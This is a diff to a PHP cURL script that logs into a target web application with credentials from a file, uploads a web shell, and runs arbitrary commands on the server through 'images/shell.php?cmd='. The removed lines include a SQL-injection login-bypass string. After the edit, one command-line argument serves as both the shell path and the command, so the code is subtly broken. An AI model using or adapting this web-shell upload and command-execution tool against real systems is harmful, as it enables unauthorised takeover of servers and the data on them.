@@ -16,7 +16,7 @@ define('USER_AGENT', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, li
 define('COOKIE_FILE', 'cookie.txt');
  
 //Target IP
-define('IP_ADDRESS', $argv[1]);
+define('IP_ADDRESS', $argv[2]);
 
 //URL of the login form.
 define('LOGIN_FORM_URL', IP_ADDRESS.'login/main_login.php');
@@ -24,9 +24,15 @@ define('LOGIN_FORM_URL', IP_ADDRESS.'login/main_login.php');
 //Login action URL. Sometimes, this is the same URL as the login form.
 define('LOGIN_ACTION_URL', IP_ADDRESS.'login/checklogin.php');
  
+//Read username and password from input text file
+$filepath = $argv[1];
+$myfile = fopen($filepath, "r") or die("Unable to open file!");
+$username = fgets($myfile);
+$password = fgets($myfile);
+fclose($myfile);
 
 //Upload file
-$shellPath = $argv[2];
+$shellPath = $argv[3];
 
 //An associative array that represents the required form fields.
 //You will need to change the keys / index names to match the name of the form
@@ -105,8 +111,6 @@ curl_setopt($curl, CURLOPT_RETURNTRANSFER, false);
 //Execute the POST request and print out the result.
 curl_exec($curl);
 
-// [?] no check for wrong input
-
 //Check for errors!
 if(curl_errno($curl)){
 	echo "Failure of uploading shell file...\n";
@@ -115,32 +119,10 @@ if(curl_errno($curl)){
 	echo "Success of uploading shell file!\n";
 }
 
-// //[?] bug to fix
-
-// //We should be logged in by now. Let's attempt to access a password protected page
-// // curl_setopt($curl, CURLOPT_URL, IP_ADDRESS.'index.php?query=anything%25%27+OR+%27x%27+LIKE+%27%25x');
-// curl_setopt($curl, CURLOPT_URL, IP_ADDRESS.'images/shell.php\?cmd\=ls');
-// //Tell cURL that we want to carry out a POST request.
-// curl_setopt($curl, CURLOPT_POST, false);
-
-// //Execute the POST request and print out the result.
-// echo curl_exec($curl);
-
-// //Check for errors!
-// if(curl_errno($curl)){
-// 	echo "Failure of running shell file...\n";
-//     throw new Exception(curl_error($curl));
-// } else{
-// 	echo "Success of running shell file!\n";
-// }
 
 $cmd = "curl -X GET ". IP_ADDRESS . "images/shell.php\?cmd\=";
 $shellcmd = $argv[3];
 
 echo shell_exec ($cmd.$shellcmd);
 
-// $output = shell_exec('ls -lart');
-// echo "<pre>$output</pre>";
-
-//Close connection
 curl_close($curl);
